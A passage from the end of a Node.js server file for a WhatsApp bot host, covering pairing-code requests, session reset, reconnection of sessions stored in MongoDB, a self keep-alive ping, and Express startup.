          const code = lastDisconnect?.error?.output?.statusCode;
          if (code !== DisconnectReason.loggedOut && code !== 401) {
            setTimeout(() => initWhatsApp(num), 5000);
          }
        }
      });

      await delay(2000);

      if (!pairSock.authState.creds.registered) {
        let code = await pairSock.requestPairingCode(num);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        return res.json({ code });
      } else {
        await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
        return res.status(400).json({ error: 'Session cleared! Please click again.' });
      }
    } catch (err) {
      if (pairSock) {
        try { pairSock.ws?.close(); } catch(e){}
      }
      return res.status(500).json({ error: 'Rate-limited. Wait 15 seconds and retry.' });
    }
  });
}

function registerAllHttpRoutes(app) {
  registerPortalRoute(app);
  registerResetAllRoute(app);
  registerResetSingleNumberRoute(app);
  registerPairRoute(app);
}

// ============================================================================
// 🔁 KEEP-ALIVE
// ============================================================================

function startKeepAlivePing() {
  const keepAliveUrl = process.env.RENDER_EXTERNAL_URL;
  if (!keepAliveUrl) return;

  setInterval(async () => {
    try {
      await fetch(keepAliveUrl);
    } catch (e) {}
  }, 4 * 60 * 1000);
}

// ============================================================================
// 🍃 STARTUP
// ============================================================================

async function reconnectAllSavedSessions() {
  try {
    const sessions = await Auth.find({ _id: /-creds$/ }).lean();
    console.log(`🔍 Found ${sessions.length} saved sessions in Database.`);

    for (const session of sessions) {
      const pNumber = session._id.split('-creds')[0];
      await initWhatsApp(pNumber);
      await delay(10000);
    }
  } catch (e) {
    console.error('Error reconnecting sessions:', e.message);
  }
}

async function startServer() {
  const app = express();
  const port = process.env.PORT || 3000;
  app.use(express.json());

  loadAllCommands();
  registerAllHttpRoutes(app);

  app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    startKeepAlivePing();
  });

  await reconnectAllSavedSessions();
}

async function main() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('🍃 MongoDB Connected!');
    await startServer();
  } catch (err) {
    console.error('MongoDB Connection Error:', err);
  }
}

main();

